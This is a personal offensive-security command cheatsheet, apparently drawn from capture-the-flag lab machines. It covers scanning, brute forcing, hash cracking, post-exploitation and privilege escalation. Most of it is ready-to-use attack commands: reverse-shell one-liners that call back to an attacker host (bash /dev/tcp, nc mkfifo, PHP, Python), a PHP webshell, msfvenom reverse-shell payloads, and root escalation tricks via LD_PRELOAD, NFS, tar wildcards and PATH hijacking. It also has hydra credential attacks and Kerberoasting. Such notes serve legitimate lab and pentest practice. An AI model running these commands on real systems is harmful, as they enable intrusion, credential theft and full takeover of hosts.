# 🗒️ Hacking Notes — Command Reference

Personal cheatsheet of commonly used commands across recon, enumeration, exploitation, and post-exploitation.

---

## 📋 Table of Contents

- [📡 TCP and UDP Scan](#-tcp-and-udp-scan)
- [📂 File and Directory Brute-Forcing](#-file-and-directory-brute-forcing)
- [🔓 Apache Password Hash Cracking](#-apache-password-hash-cracking)
- [🔑 Basic Auth Brute Force](#-basic-auth-brute-force)
- [🌐 Subdomain Enumeration](#-subdomain-enumeration)
- [🖥️ Add IP to Hosts](#%EF%B8%8F-add-ip-to-hosts)
- [🖱️ Set STTY (Fix Terminal Size)](#%EF%B8%8F-set-stty-fix-terminal-size)
- [🔗 Make All Necessary Symlinks](#-make-all-necessary-symlinks)
- [🐚 Reverse Shell Listeners & Payloads](#-reverse-shell-listeners--payloads)
- [🔐 SSH Key Cracking & Stripping](#-ssh-key-cracking--stripping)
- [🔐 GPG / PGP](#-gpg--pgp)
- [📁 FTP Enumeration](#-ftp-enumeration)
- [🗄️ Hash Cracking — Common Modes](#%EF%B8%8F-hash-cracking--common-modes)
- [🔍 Post-Exploitation Enumeration](#-post-exploitation-enumeration)
- [🏆 GTFOBins — Common sudo Escapes](#-gtfobins--common-sudo-escapes)
- [🔧 Systemd Service Abuse](#-systemd-service-abuse)
- [🐳 Docker / LXD Privilege Escalation](#-docker--lxd-privilege-escalation)
- [🪟 Windows / Active Directory](#-windows--active-directory)
- [🔌 SMB Enumeration](#-smb-enumeration)
- [📂 NFS Enumeration & Exploitation](#-nfs-enumeration--exploitation)
- [🔴 Redis Enumeration](#-redis-enumeration)
- [📡 rsync Enumeration](#-rsync-enumeration)
- [🔒 SSH Tunneling](#-ssh-tunneling)
- [🗝️ WordPress (WPScan)](#%EF%B8%8F-wordpress-wpscan)
- [🎭 Steganography](#-steganography)
- [🏷️ Payload Generation (msfvenom)](#%EF%B8%8F-payload-generation-msfvenom)
- [🗃️ SQLite Credential Extraction](#%EF%B8%8F-sqlite-credential-extraction)
- [🨤 Tar Wildcard Injection (cron privesc)](#-tar-wildcard-injection-cron-privesc)
- [🔃 PATH Hijack (SUID binary)](#-path-hijack-suid-binary)
- [🖥️ Serve Files (HTTP server)](#%EF%B8%8F-serve-files-http-server)

---

## 📡 TCP and UDP Scan

Full TCP scan with version + scripts
```bash
sudo nmap -sC -sV -v -p- -oA tcpscan-<ip>
```

Quick top ports first (faster)
```bash
sudo nmap -sC -sV --top-ports 1000 -oA quickscan-<ip>
```

UDP scan (top ports, slow by nature)
```bash
sudo nmap -sU -v --top-ports 200 -oA udpscan-<ip>
```

Aggressive scan (OS detection + traceroute)
```bash
sudo nmap -A -v -oA aggressivescan-<ip>
```

Scan specific ports
```bash
sudo nmap -sC -sV -p 80,443,8080 <ip>
```

Previous targets
```bash
sudo nmap -sC -sV -v -p- vulnnet-entertainment -oA vulnnet-entertainment
sudo nmap -sU -v node -oA udpscan-node
```

---

## 📂 File and Directory Brute-Forcing

ffuf — directories
```bash
ffuf -u http://<ip>/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403,401
```

ffuf — files
```bash
ffuf -u http://<ip>/FUZZ -w ./Web-Content/raft-medium-files.txt -ic -fc 403,401
```

ffuf — with extensions
```bash
ffuf -u http://<ip>/FUZZ -w ./Web-Content/raft-medium-words.txt -e .php,.txt,.html,.bak,.zip -ic -fc 403,401
```

ffuf — with auth header
```bash
ffuf -u http://<ip>/FUZZ -w ./Web-Content/raft-medium-directories.txt -H "Authorization: Bearer <token>" -ic -fc 403,401
```

gobuster
```bash
gobuster dir -u http://<ip> -w ./Web-Content/raft-medium-directories.txt -x php,txt,html -t 50 --no-error
```

feroxbuster (recursive)
```bash
feroxbuster -u http://<ip> -w ./Web-Content/raft-medium-directories.txt -x php,txt,html --depth 3
```

Previous targets
```bash
ffuf -u http://broadcast.vulnnet.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403,401
ffuf -u http://broadcast.vulnnet.thm/FUZZ -w ./Web-Content/raft-medium-files.txt -ic -fc 403,401
```

---

## 🔓 Apache Password Hash Cracking

Extract hash and crack with john
```bash
echo '$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > hash.txt
john --wordlist=./rockyou.txt --format=md5crypt-long hash.txt
```

hashcat equivalent (mode 1600 = Apache `$apr1$`)
```bash
hashcat -m 1600 hash.txt ./rockyou.txt
```

Identify hash type first
```bash
hash-identifier
hashid hash.txt
```

Common Apache hash formats
```bash
# $apr1$ = md5crypt-long (john) / mode 1600 (hashcat)
# {SHA}   = SHA1 base64
# $2y$    = bcrypt
```

Show cracked
```bash
john --show --format=md5crypt-long hash.txt
```

---

## 🔑 Basic Auth Brute Force

hydra — http-get
```bash
hydra -l admin -P ./Passwords/Common-Credentials/10k-most-common.txt <ip> http-get / -v
```

hydra — with username list
```bash
hydra -L ./Usernames/top-usernames-shortlist.txt -P ./Passwords/Common-Credentials/10k-most-common.txt <ip> http-get / -v
```

hydra — rockyou
```bash
hydra -l admin -P ./Passwords/Leaked-Databases/rockyou.txt <ip> http-get / -t 4 -v
```

hydra — http-post-form
```bash
hydra -l admin -P ./Passwords/Common-Credentials/10k-most-common.txt <ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

hydra — SSH
```bash
hydra -l <user> -P ./Passwords/Leaked-Databases/rockyou.txt -t 4 -v -f <ip> ssh
```

hydra — FTP with credential list
```bash
hydra -L user.txt -P pw.txt ftp://<ip> -t 4 -vV -f
```

medusa
```bash
medusa -h <ip> -u admin -P ./Passwords/Common-Credentials/10k-most-common.txt -M http -m DIR:/ -v 6
```

Previous targets
```bash
hydra -l admin -P ./Passwords/Common-Credentials/10k-most-common.txt broadcast.vulnnet.thm http-get / -v
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 -v -f library ssh
```

---

## 🌐 Subdomain Enumeration

ffuf vhost fuzzing
```bash
ffuf -u http://<ip>/ -H "Host: FUZZ.<domain>.thm" -w ./DNS/subdomains-top1million-5000.txt -ic -fs <size>
```

Larger wordlist
```bash
ffuf -u http://<ip>/ -H "Host: FUZZ.<domain>.thm" -w ./DNS/subdomains-top1million-20000.txt -ic -fs <size>
```

gobuster vhost
```bash
gobuster vhost -u http://<ip> -w ./DNS/subdomains-top1million-5000.txt --append-domain
```

wfuzz
```bash
wfuzz -c -w ./DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<domain>.thm" --hw http://<ip>/
```

Previous targets
```bash
ffuf -u http://vulnnet-entertainment/ -H "Host: FUZZ.vulnnet.thm" -w ./DNS/subdomains-top1million-5000.txt -ic -fs 5829
```

---

## 🖥️ Add IP to Hosts

Single target
```bash
echo '10.113.163.115 vulnnet-entertainment.thm vulnnet-entertainment' >> /etc/hosts
```

Generic template
```bash
echo '<ip> <hostname>.thm <hostname>' >> /etc/hosts
```

Verify
```bash
ping -c1 <hostname>
cat /etc/hosts | tail -5
```

---

## 🖱️ Set STTY (Fix Terminal Size)

After getting a reverse shell
```bash
stty rows 62 cols 149
```

Get your current terminal size first (run on YOUR machine)
```bash
stty size
```

Full shell upgrade sequence
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 62 cols 149
```

Fallback when Python is not available
```bash
script /dev/null -c bash
# Then Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

---

## 🔗 Make All Necessary Symlinks

SecLists shortcuts
```bash
ln -sfv /etc/hosts
ln -sfv ~/SecLists/Discovery/Web-Content/
ln -sfv ~/SecLists/Discovery/DNS/
ln -sfv ~/SecLists/Passwords/
ln -sfv ~/SecLists/Usernames
```

Verify links
```bash
ls -la | grep ^l
```

---

## 🐚 Reverse Shell Listeners & Payloads

netcat listener
```bash
nc -nlvp 4444
nc -nlvp 443 -s <your-ip>
```

bash reverse shell (URL-encode when passing via GET param)
```bash
bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'
```

mkfifo reverse shell (works without bash)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 4444 >/tmp/f
```

PHP fsockopen reverse shell (useful when exec/system functions are available)
```php
php -r '$sock=fsockopen("<ip>",4444);exec("/bin/sh <&3 >&3 2>&3");'
```

Python reverse shell (useful for RATs/REPLs)
```python
import socket,subprocess,os
s=socket.socket()
s.connect(("<ip>",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh"])
```

PHP webshell (minimal)
```php
<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>
```

PHP reverse shell trigger
```bash
curl "http://<ip>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<lhost>/4444+0>%261'"
```

---

## 🔐 SSH Key Cracking & Stripping

Crack passphrase with john
```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=./rockyou.txt
```

Crack PGP private key passphrase
```bash
gpg2john private.asc > private.hash
john private.hash --wordlist=./rockyou.txt
```

Strip passphrase from SSH key (after cracking)
```bash
ssh-keygen -p -N "" -f ./id_rsa
```

Connect with private key
```bash
ssh -i id_rsa <user>@<ip>
chmod 600 id_rsa  # required if permissions are wrong
```

---

## 🔐 GPG / PGP

Import and decrypt
```bash
gpg --import private.asc      # prompts for passphrase
gpg --decrypt backup.pgp
```

Import public key only (no passphrase needed)
```bash
gpg --import private.asc
```

Full flow (crack passphrase → import → decrypt)
```bash
gpg2john private.asc > hash.txt
john hash.txt --wordlist=./rockyou.txt
gpg --import private.asc   # enter cracked passphrase
gpg --decrypt backup.pgp
```

Decrypt .gpg file directly (key already imported)
```bash
gpg --decrypt file.xlsx.gpg > file.xlsx
# If key is expired, decryption still works — gpg will warn but proceed
```

---

## 📁 FTP Enumeration

Anonymous login
```bash
ftp
ftp> open <ip>
# Name: anonymous
# Password: (blank)
```

Useful FTP commands
```bash
ftp> ls -lah          # list with hidden files
ftp> cd <dir>
ftp> cd ..            # go up — useful if webroot subdir is write-protected
ftp> get <file>
ftp> put <file>       # upload file
ftp> prompt off       # disable transfer prompts
ftp> mget *           # download all files
```

Downloading files with tricky names
```bash
ftp> get -            # downloads file literally named "-"
```

---

## 🗄️ Hash Cracking — Common Modes

| Hash Type | john format | hashcat mode |
|---|---|---|
| NT (Windows) | `nt` | `1000` |
| MD5 (Unix `$1$`) | `md5crypt` | `500` |
| SHA-512 (Unix `$6$`) | `sha512crypt` | `1800` |
| Apache MD5 (`$apr1$`) | `md5crypt-long` | `1600` |
| bcrypt (`$2y$`) | `bcrypt` | `3200` |
| ASREPRoast (`$krb5asrep$`) | — | `18200` |
| Kerberoast (`$krb5tgs$`) | — | `13100` |

```bash
# NT hash (Windows)
hashcat -m 1000 hash.txt ./rockyou.txt

# SHA-512 Unix
hashcat -m 1800 hash.txt ./rockyou.txt

# ASREPRoast
hashcat -m 18200 asrep.hash ./rockyou.txt

# Kerberoast
hashcat -m 13100 krb.txt ./rockyou.txt

# john with zip
zip2john backup.zip > backup.hash
john backup.hash --wordlist=./rockyou.txt
```

---

## 🔍 Post-Exploitation Enumeration

SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -lah
```

Writable files / directories
```bash
find / -writable -type f 2>/dev/null
find /etc/systemd/system/ -writable 2>/dev/null
```

sudo rights
```bash
sudo -l
```

Credential hunting
```bash
cat ~/.bash_history
cat ~/.zsh_history
grep -r "password" /var/www/html/ 2>/dev/null
grep -r "DB_PASSWORD" /var/www/html/ 2>/dev/null
```

Files owned by specific user
```bash
find / -type f -user <username> 2>/dev/null
```

Running processes and internal ports
```bash
ps auxf
ss -ntl
netstat -tulnp
```

Cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron*
```

Monitor file changes (watch for cron triggers)
```bash
watch -n 1 ls -lah /bin/bash
watch -n 1 'ls -lah /bin/bash'
```

---

## 🏆 GTFOBins — Common sudo Escapes

sudo vim
```bash
sudo /usr/bin/vim
# inside vim:
:!/bin/sh
```

sudo ftp
```bash
sudo /usr/bin/ftp
ftp> !/bin/sh
```

sudo chmod (SUID bash)
```bash
sudo /bin/chmod +s /bin/bash
/bin/bash -p
```

sudo zip
```bash
sudo /usr/bin/zip hello.zip /etc/hosts -T -TT '/bin/sh #'
```

SUID Python interpreter
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

sudo npm (run arbitrary shell via package.json)
```bash
echo '{"scripts":{"shell":"sh"}}' > /tmp/package.json
sudo -u <user> /usr/bin/npm run shell --prefix /tmp
```

sudo perl (via script in user-controlled directory)
```bash
# If script path is in a directory you own, replace the script:
echo '#!/usr/bin/python3' > /home/<user>/script.py
echo 'import os; os.system("chmod +s /bin/bash")' >> /home/<user>/script.py
sudo /usr/bin/perl /home/<user>/script.pl
```

LD_PRELOAD (if env_keep+=LD_PRELOAD in sudoers)
```c
// root.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash");
}
```
```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=$PWD/root.so /usr/bin/<allowed-binary>
```

---

## 🔧 Systemd Service Abuse

Writable service file + sudo restart = root
```bash
# Find writable unit files
find /etc/systemd/system/ -writable 2>/dev/null

# Edit ExecStart or inject ExecStartPre
# /etc/systemd/system/vulnerable.service:
[Service]
ExecStart=/bin/chmod +s /bin/bash
# or:
ExecStartPre=/bin/chmod +s /bin/bash

# Reload and trigger
systemctl daemon-reload
sudo /usr/sbin/service <name> restart
# or
sudo /bin/systemctl start <timer-name>
```

---

## 🐳 Docker / LXD Privilege Escalation

Docker group — mount host filesystem
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

LXD group — privileged container + host bind mount
```bash
# Build Alpine image on attacker machine
git clone https://github.com/saghul/lxd-alpine-builder
sudo bash build-alpine

# Transfer image to target, then:
lxc image import alpine-v3.x-x86_64.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc hostfs disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- /bin/sh
# host filesystem accessible at /mnt/root
```

---

## 🪟 Windows / Active Directory

Kerbrute — validate/enumerate users
```bash
./kerbrute userenum -d <domain> ./users.txt --dc <dc-ip>
```

ASREPRoasting (no creds needed)
```bash
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <ip>
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <ip> -outputfile asrep.hash
```

Kerberoasting (needs valid creds)
```bash
impacket-GetUserSPNs <domain>/<user> -dc-ip <ip> -request
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile krb.hash
```

SID brute-force / user enumeration (guest session)
```bash
impacket-lookupsid <domain>/guest@<ip>
```

WinRM shell
```bash
evil-winrm -i <ip> -u <user> -p <password>
evil-winrm -i <domain> -u <user> -p <password>
```

Check group membership
```bash
net user <user> /domain
net localgroup administrators
```

Service binPath hijack (Server Operators)
```bash
sc.exe config <service> binPath= "cmd.exe /c net localgroup administrators <user> /add"
sc.exe start <service>
```

AlwaysInstallElevated check
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Malicious MSI (if AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi > rev.msi
# on target:
msiexec /quiet /qn /i rev.msi
```

---

## 🔌 SMB Enumeration

List shares (anonymous/guest)
```bash
smbclient -L //<ip> -N
smbclient -L //<ip> -U guest
```

Connect to share
```bash
smbclient //<ip>/<share> -N
smbclient //<ip>/<share> -U <user>
```

List and download files
```bash
smb: \> ls
smb: \> get <file>
smb: \> mget *
```

---

## 📂 NFS Enumeration & Exploitation

Show exports
```bash
showmount -e <ip>
```

Mount export (direct)
```bash
sudo mount -t nfs <ip>:/opt/conf /tmp/nfs
ls -la /tmp/nfs
```

Mount internal NFS via SSH tunnel (port not exposed externally)
```bash
# Step 1 — forward local 2049 to target's NFS
ssh -i id_rsa -L 2049:localhost:2049 <user>@<ip>

# Step 2 — mount as root on attacker (separate terminal)
sudo mount -t nfs -o port=2049,nolock,nfsvers=4 127.0.0.1:/ /tmp/nfs
```

Check for no_root_squash
```bash
cat /etc/exports
# Look for: no_root_squash
# This means attacker root retains UID 0 on the mount
```

NFS no_root_squash — SUID bash privesc
```bash
# On target as low-priv user — copy native bash into NFS-exported dir
cp /bin/bash /home/<user>/

# On attacker as root — set SUID via NFS mount
chown root:root /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target as low-priv user — execute
./bash -p
# euid=0(root)
```

NFS no_root_squash — SSH key injection
```bash
# On attacker as root — write directly into user's .ssh via NFS mount
echo '<pubkey>' >> /tmp/nfs/.ssh/authorized_keys
# Then SSH in as that user
```

---

## 🔴 Redis Enumeration

Connect (authenticated)
```bash
redis-cli -h <ip> -a '<password>'
redis-cli -h <ip>
```

Enumerate keys
```bash
keys *
get <key>
LRANGE <key> 0 -1
type <key>
```

---

## 📡 rsync Enumeration

List modules
```bash
rsync rsync://<ip>
rsync rsync://rsync-connect@<ip>
```

List files in module
```bash
rsync --list-only rsync://<user>@<ip>/<module>/
```

Download files
```bash
rsync rsync://<user>@<ip>/<module>/ ./loot/
rsync --password-file=pw.txt rsync://<user>@<ip>/<module>/<file> .
```

Upload file (key injection)
```bash
rsync --password-file=pw.txt -av ./id_rsa.pub rsync://<user>@<ip>/<module>/.ssh/authorized_keys
```

---

## 🔒 SSH Tunneling

Local port forward (reach internal service)
```bash
ssh -i id_rsa <user>@<ip> -L 127.0.0.1:<local-port>:127.0.0.1:<remote-port>
# then access via: http://127.0.0.1:<local-port>
```

Dynamic SOCKS proxy
```bash
ssh -i id_rsa <user>@<ip> -D 1080
# use with proxychains
```

---

## 🗝️ WordPress (WPScan)

Enumerate users, plugins, themes
```bash
wpscan --url http://<ip> --api-token $wptoken -e u,vp,vt,dbe
```

Brute-force users
```bash
wpscan --url http://<ip> -U <user1>,<user2> -P ./rockyou.txt --api-token $wptoken
```

---

## 🎭 Steganography

steghide extract
```bash
steghide extract -sf <image.jpg>
steghide extract -sf <image.jpg> -p "<passphrase>"
```

steghide info
```bash
steghide info <image.jpg>
```

Note: if steghide fails on a JPEG, check magic bytes with `xxd <file> | head` — first bytes should be `ff d8 ff`.

---

## 🏷️ Payload Generation (msfvenom)

Windows reverse shell EXE
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe        # x86
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe    # x64
```

Tomcat WAR (Java JSP)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o shell.war
```

Windows MSI (for AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi > rev.msi
```

Linux ELF
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf
```

---

## 🗃️ SQLite Credential Extraction

```bash
sqlite3 users.bak
.tables
SELECT * FROM users;
.quit
```

---

## 🨤 Tar Wildcard Injection (cron privesc)

When a cron job runs `tar *` in a directory you control:
```bash
cd /home/<user>/Documents  # or wherever the cron tars

cat > shell.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

chmod +x shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"

# Wait for cron to fire, then:
watch -n 1 'ls -lah /bin/bash'
/bin/bash -p
```

---

## 🔃 PATH Hijack (SUID binary)

When a SUID binary calls a utility without absolute path:
```bash
# Confirm with strings
strings <binary> | grep -v ^/

# Drop malicious binary in /tmp
echo '/bin/bash' > /tmp/<utility-name>
chmod +x /tmp/<utility-name>
export PATH=/tmp:$PATH

# Run the SUID binary
./<suid-binary>
```

---

## 🖥️ Serve Files (HTTP server)

Python HTTP server
```bash
python3 -m http.server 8080
python3 -m http.server 8080 --bind <ip>
```

Download on target
```bash
wget http://<ip>:8080/<file>
curl -o <file> http://<ip>:8080/<file>
# Windows:
certutil -urlcache -split -f http://<ip>:8080/<file> C:\temp\<file>
```
